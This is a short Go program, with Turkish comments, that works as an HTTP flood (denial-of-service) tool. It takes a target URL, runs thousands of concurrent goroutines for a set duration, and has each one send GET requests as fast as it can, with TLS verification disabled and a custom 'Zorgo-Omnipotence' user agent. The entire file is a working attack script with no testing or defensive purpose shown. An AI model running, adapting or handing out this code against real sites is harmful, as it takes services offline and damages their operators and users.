package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"runtime"
	"sync"
	"time"
)

func main() {
	target := flag.String("u", "", "Hedef URL/IP")
	duration := flag.Int("t", 60, "Süre (Saniye)")
	threads := flag.Int("p", 5000, "Paralel Güç (Threads)")
	flag.Parse()

	if *target == "" { return }

	// Tüm CPU gücünü kullan
	runtime.GOMAXPROCS(runtime.NumCPU())
	var wg sync.WaitGroup
	timeout := time.After(time.Duration(*duration) * time.Second)

	// Tanrı Modu Bağlantı Ayarları
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConnsPerHost: *threads,
	}
	client := &http.Client{Transport: tr}

	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-timeout:
					return
				default:
					req, _ := http.NewRequest("GET", *target, nil)
					req.Header.Set("User-Agent", "Zorgo-Omnipotence/1.0")
					client.Do(req)
				}
			}
		}()
	}
	wg.Wait()
}
